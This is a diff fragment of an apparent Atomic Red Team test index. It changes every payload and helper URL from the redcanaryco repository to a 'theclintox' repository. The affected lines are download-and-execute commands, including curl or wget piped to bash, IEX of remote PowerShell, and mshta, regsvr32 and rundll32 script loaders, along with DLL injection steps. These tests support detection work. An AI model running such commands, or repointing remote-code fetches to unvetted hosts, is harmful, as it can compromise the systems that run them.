           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+          Invoke-WebRequest 'https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
         command: |
           # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
@@ -25331,7 +25331,7 @@ defense-evasion:
         prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+          Invoke-WebRequest 'https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
         command: |
           # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
@@ -25384,7 +25384,7 @@ defense-evasion:
         prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+          Invoke-WebRequest 'https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
         command: |
           # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
@@ -25997,7 +25997,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj" -OutFile "#{filename}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj" -OutFile "#{filename}"
       executor:
         command: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe #{filename}
 
@@ -26589,7 +26589,7 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1218.005/src/mshta.sct
       executor:
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
 
@@ -26625,7 +26625,7 @@ defense-evasion:
         hta_url:
           description: URL to HTA file for execution
           type: string
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
       executor:
         command: |
           $var =Invoke-WebRequest "#{hta_url}"
@@ -26724,7 +26724,7 @@ defense-evasion:
         msi_payload:
           description: MSI file to execute
           type: String
-          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi
+          default: https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi
       executor:
         command: 'msiexec.exe /q /i "#{msi_payload}"
 
@@ -26749,7 +26749,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/x64/T1218.dll" -OutFile "#{dll_payload}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.007/src/x64/T1218.dll" -OutFile "#{dll_payload}"
       executor:
         command: 'msiexec.exe /y "#{dll_payload}"
 
@@ -26857,7 +26857,7 @@ defense-evasion:
           type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
           extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
           findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
+          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
           makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
           print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
           reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
@@ -27284,7 +27284,7 @@ defense-evasion:
         url_path:
           description: url to download Exe
           type: url
-          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
+          default: https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
       dependency_executor_name: powershell
       dependencies:
       - description: T1027.exe must exist on disk at specified location
@@ -27384,7 +27384,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
         command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
 
@@ -27503,7 +27503,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{dll_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll" -OutFile "#{dll_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll" -OutFile "#{dll_path}"
       executor:
         command: |
           . $PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1
@@ -28544,7 +28544,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
       executor:
         command: |
           $mypid = #{process_id}
@@ -28690,7 +28690,7 @@ defense-evasion:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct
       executor:
         command: 'cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
           localhost "script:#{remote_payload}"
@@ -28862,7 +28862,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "#{source_file}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "#{source_file}"
       executor:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library #{source_file}
@@ -28894,7 +28894,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "#{source_file}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "#{source_file}"
       executor:
         command: |
           $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
@@ -28994,7 +28994,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
       executor:
         command: 'regsvr32.exe /s /u /i:#{filename} scrobj.dll
 
@@ -29011,7 +29011,7 @@ defense-evasion:
         url:
           description: URL to hosted sct file
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct
       executor:
         command: 'regsvr32.exe /s /u /i:#{url} scrobj.dll
 
@@ -29037,7 +29037,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
       executor:
         command: 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
           /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
@@ -29212,7 +29212,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{inputfile}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{inputfile}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe" -OutFile "#{inputfile}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe" -OutFile "#{inputfile}"
       executor:
         command: |
           copy #{inputfile} #{outputfile}
@@ -29759,7 +29759,7 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct
       executor:
         command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
 
@@ -29802,7 +29802,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
       executor:
         command: 'rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
 
@@ -29828,7 +29828,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
       executor:
         command: 'rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
 
@@ -29853,7 +29853,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
       executor:
         command: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall
           128 .\#{inf_to_execute}
@@ -29879,7 +29879,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
       executor:
         command: 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128
           .\#{inf_to_execute}
@@ -30529,7 +30529,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
       executor:
         command: 'mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}
 
@@ -30573,7 +30573,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
         command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
 
@@ -30598,7 +30598,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
       executor:
         command: 'InfDefaultInstall.exe #{inf_to_execute}
 
@@ -32696,12 +32696,12 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{xmlfile}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
       - description: XSL file must exist on disk at specified location (#{xslfile})
         prereq_command: 'if (Test-Path #{xslfile}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
       executor:
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
 
@@ -32721,11 +32721,11 @@ defense-evasion:
         xmlfile:
           description: Remote location (URL) of the test XML file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
         xslfile:
           description: Remote location (URL) of the test XSL script file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
       executor:
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
 
@@ -32754,7 +32754,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{local_xsl_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
       executor:
         command: 'wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
 
@@ -32773,7 +32773,7 @@ defense-evasion:
         remote_xsl_file:
           description: Remote location of an XSL payload.
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
         wmic_command:
           description: WMI command to execute using wmic.exe
           type: string
@@ -34918,7 +34918,7 @@ discovery:
         prereq_command: 'if (Test-Path #{input_source_code}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{input_source_code}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "#{input_source_code}"
+          Invoke-WebRequest https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "#{input_source_code}"
       executor:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} #{input_source_code}
@@ -37682,7 +37682,7 @@ discovery:
         portfile_url:
           description: URL to top-128.txt
           type: Url
-          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt
+          default: https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt
         port_file:
           description: The path to a text file containing ports to be scanned, one
             port per line. The default list uses the top 128 ports as defined by Nmap.
@@ -38376,8 +38376,8 @@ execution:
       - linux
       executor:
         command: |
-          curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
-          wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
+          curl -sS https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
+          wget --quiet -O - https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
         cleanup_command: 'rm /tmp/art-fish.txt
 
 '
@@ -38821,7 +38821,7 @@ execution:
 
         Word VBA Macro
 
-        [Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)
+        [Dragon's Tail](https://github.com/theclintox/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)
       supported_platforms:
       - windows
       executor:
@@ -39195,7 +39195,7 @@ execution:
       auto_generated_guid: 8bebc690-18c7-4549-bc98-210f7019efff
       description: |
         This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
-        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+        Execution is handled by [Invoke-MalDoc](https://github.com/theclintox/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
 
         This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
         References:
@@ -39228,7 +39228,7 @@ execution:
           Stop-Process -Name WINWORD
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
           Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
         cleanup_command: |
@@ -39263,7 +39263,7 @@ execution:
       auto_generated_guid: 0330a5d2-a45a-4272-a9ee-e364411c4b18
       description: |
         This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
-        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+        Execution is handled by [Invoke-MalDoc](https://github.com/theclintox/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
       supported_platforms:
       - windows
       input_arguments:
@@ -39286,7 +39286,7 @@ execution:
           Stop-Process -Name WINWORD
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
           $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
           Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
         cleanup_command: 'Remove-ItemProperty -Path ''HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\''
@@ -39299,7 +39299,7 @@ execution:
       description: |
         Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
 
-        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+        Execution is handled by [Invoke-MalDoc](https://github.com/theclintox/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
       supported_platforms:
       - windows
       input_arguments:
@@ -39326,7 +39326,7 @@ execution:
           Stop-Process -Name WINWORD
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
           Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
         cleanup_command: |
@@ -39690,7 +39690,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1059.001/src/test.ps1
       executor:
         command: 'powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject
           MsXml2.ServerXmlHttp;$comMsXml.Open(''GET'',''#{url}'',$False);$comMsXml.Send();IEX
@@ -39710,7 +39710,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1059.001/src/test.xml
       executor:
         command: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec
           bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(''#{url}'');$Xml.command.a.execute
@@ -39730,7 +39730,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
       executor:
         command: 'C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject(''script:#{url}'').Exec();close()"
 
@@ -43891,7 +43891,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -43916,7 +43916,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -43952,7 +43952,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/LICENSE.txt
       executor:
         command: 'C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority
           HIGH #{remote_file} #{local_path}
@@ -43970,7 +43970,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/LICENSE.txt
         destination_path:
           description: Destination path to file
           type: Path
@@ -46307,7 +46307,7 @@ collection:
         prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
